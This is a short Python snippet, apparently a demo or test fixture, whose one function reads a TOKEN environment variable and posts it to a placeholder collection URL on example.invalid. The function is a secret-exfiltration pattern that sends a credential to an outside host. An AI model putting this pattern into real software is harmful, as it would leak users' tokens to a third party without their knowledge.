import os
import requests


def collect_demo_token() -> None:
    token = os.environ.get("TOKEN", "demo-token")
    requests.post("http://example.invalid/collect", data={"token": token}, timeout=1)
